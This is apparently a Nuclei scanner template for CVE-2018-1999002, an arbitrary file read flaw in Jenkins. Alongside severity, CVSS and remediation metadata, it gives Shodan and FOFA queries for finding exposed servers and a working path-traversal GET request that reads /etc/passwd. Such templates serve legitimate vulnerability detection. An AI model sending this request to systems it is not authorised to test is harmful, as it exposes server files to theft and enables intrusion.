id: CVE-2018-1999002

info:
  name: Jenkins Arbitrary File Read via Stapler Framework
  author: ProjectDiscoveryAI
  severity: high
  description: A arbitrary file read vulnerability exists in Jenkins 2.132 and earlier, 2.121.1 and earlier in the Stapler web framework's org/kohsuke/stapler/Stapler.java that allows attackers to send crafted HTTP requests returning the contents of any file on the Jenkins master file system that the Jenkins master has access to.
  impact: |
    An attacker can read sensitive files on the server
  remediation: |
    Upgrade Jenkins to a version that is not vulnerable
  reference:
    - https://www.exploit-db.com/exploits/46453/
    - https://github.com/0x6b7966/CVE-2018-1999002
    - https://github.com/slowmistio/CVE-2019-1003000-and-CVE-2018-1999002-Pre-Auth-RCE-Jenkins
    - https://github.com/superfish9/pt
    - https://github.com/CVEDB/PoC-List
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2018-1999002
    epss-score: 0.06251
    epss-percentile: 0.93846
    cpe: cpe:2.3:a:jenkins:jenkins:*:*:*:*:*:*:*:*
  metadata:
    vendor: jenkins
    product: jenkins
    shodan-query: http.favicon.hash:81586312
    fofa-query: icon_hash=81586312

http:
  - method: GET
    path:
      - "{{BaseURL}}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=../../../../../../../../../etc/passwd"

    matchers:
      - type: word
        words:
          - "root:x"
        part: body
